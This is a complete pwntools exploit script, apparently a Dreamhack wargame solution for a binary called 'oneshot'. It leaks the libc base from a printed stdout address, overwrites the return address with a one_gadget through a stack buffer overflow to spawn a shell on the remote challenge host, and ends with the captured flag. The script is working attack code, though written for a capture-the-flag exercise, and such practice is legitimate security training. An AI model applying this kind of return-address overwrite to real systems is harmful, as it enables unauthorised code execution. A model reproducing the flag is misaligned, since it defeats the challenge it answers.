from pwn import *

local = 0

if local == 1 :
    p = process("./oneshot")
    one_gadget = [0x4f365,0x4f3c2,0x10a45c]
    stdout_offset = 0x3ec760
else :
    p = remote("host1.dreamhack.games",8444)
    one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]
    stdout_offset = 0x3c5620
    
p.recvuntil("stdout: ")
libc_base = int(p.recvline(),16) - stdout_offset
one = libc_base + one_gadget[0]

log.info(hex(libc_base))
    
payload = ""
payload += "a"*0x18
payload += p64(0)
payload += "b"*0x8
payload += p64(one)

p.sendlineafter("MSG:",payload)


p.interactive()
#DH{a6e74f669acffd69602b76c81c0516b2}